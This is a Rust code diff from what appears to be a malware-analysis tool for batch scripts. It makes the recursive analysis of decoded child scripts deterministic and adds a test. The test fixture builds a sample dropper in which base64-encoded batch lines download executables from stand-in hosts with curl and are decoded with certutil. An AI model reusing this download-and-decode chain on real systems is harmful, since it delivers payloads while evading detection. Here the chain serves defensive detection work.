@@ -4331,7 +4331,7 @@ fn analyze_extracted_payloads(env: &mut Environment, out: &mut String, depth: u3
             return;
         }
         // Collect candidates first to avoid borrow conflicts.
-        let candidates: Vec<(String, Vec<u8>)> = env
+        let mut candidates: Vec<(String, Vec<u8>)> = env
             .modified_filesystem
             .iter()
             .filter_map(|(k, v)| {
@@ -4345,7 +4345,13 @@ fn analyze_extracted_payloads(env: &mut Environment, out: &mut String, depth: u3
                 content.map(|c| (k.clone(), c))
             })
             .collect();
+        candidates.sort_by(|(left_dst, left_content), (right_dst, right_content)| {
+            left_dst
+                .cmp(right_dst)
+                .then_with(|| left_content.cmp(right_content))
+        });
 
+        let mut processed_any = false;
         for (dst, content) in candidates {
             if !looks_like_batch(&content) {
                 continue;
@@ -4354,6 +4360,7 @@ fn analyze_extracted_payloads(env: &mut Environment, out: &mut String, depth: u3
             if !seen.insert(fp) {
                 continue;
             }
+            processed_any = true;
             env.traits.push(Trait::RecursiveAnalysis {
                 dst: dst.clone(),
                 depth,
@@ -4398,7 +4405,12 @@ fn analyze_extracted_payloads(env: &mut Environment, out: &mut String, depth: u3
             deob_scan::scan_deob_text(&decoded_text, env);
             deob_scan::scan_deob_text(&child_out, env);
             deob_scan::scan_embedded_powershell_invocations(&decoded_text, env);
-            // After recursion, check if new decoded files appeared (depth+1 cap).
+        }
+
+        // After all current-depth siblings are processed, check whether any of
+        // them produced new decoded files. This keeps sibling ordering and
+        // depth reporting independent of hash-map iteration order.
+        if processed_any {
             walk(env, out, depth + 1, seen);
         }
     }
@@ -11711,6 +11723,50 @@ mod recursive_payload_tests {
         assert!(
             has,
             "inline echo certutil chain missed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn decoded_child_scripts_are_reported_in_stable_path_order() {
+        let a_bat = "curl -o a.exe http://a.example/p\r\n";
+        let b_bat = "curl -o z.exe http://z.example/p\r\n";
+        let a_b64 = base64::engine::general_purpose::STANDARD.encode(a_bat.as_bytes());
+        let b_b64 = base64::engine::general_purpose::STANDARD.encode(b_bat.as_bytes());
+        let script = format!(
+            "echo {b_b64}>b.src\r\n\
+             certutil -decode b.src z-child.bat\r\n\
+             echo {a_b64}>a.src\r\n\
+             certutil -decode a.src a-child.bat\r\n"
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+        let a_banner = report
+            .deobfuscated
+            .find("decoded child script (a-child.bat)")
+            .expect("missing a-child decoded banner");
+        let z_banner = report
+            .deobfuscated
+            .find("decoded child script (z-child.bat)")
+            .expect("missing z-child decoded banner");
+        assert!(
+            a_banner < z_banner,
+            "decoded child banners should be stable path order:\n{}",
+            report.deobfuscated
+        );
+
+        let recursive_dsts: Vec<_> = report
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::RecursiveAnalysis { dst, depth: 1 } => Some(dst.as_str()),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            recursive_dsts,
+            vec!["a-child.bat", "z-child.bat"],
+            "recursive traits should be stable path order: {:?}",
             report.traits
         );
     }
